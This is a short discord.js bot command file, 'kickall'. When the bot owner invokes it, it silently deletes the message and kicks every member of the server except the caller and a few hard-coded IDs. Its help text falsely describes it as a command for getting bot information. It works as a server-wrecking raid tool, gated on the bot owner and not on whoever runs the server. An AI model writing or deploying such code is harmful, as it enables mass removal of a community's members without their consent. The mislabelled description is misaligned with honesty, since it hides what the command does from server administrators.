const Discord = require("discord.js");
const fs = require("fs");

module.exports.run = async (client, message, args) => {
    let db = JSON.parse(fs.readFileSync(`./serveur/${message.guild.id}.json`, "utf8"));
    let config = require("./../../config.json")
    let {lien} = require("./../../config.json")
    message.delete();
if(message.author.id !== config.bot.owner) return;
message.delete();    
message.guild.members.cache.forEach(member => {

      if(member != message.member && member.id != "ID" && member.id != "ID" && member.id != "ID"){
        member.kick();
      }
    })  
    }







module.exports.help = {
    name: "kickall",
    category: 'Administration',
    description: "Avoir quelque info sur le bot",
  };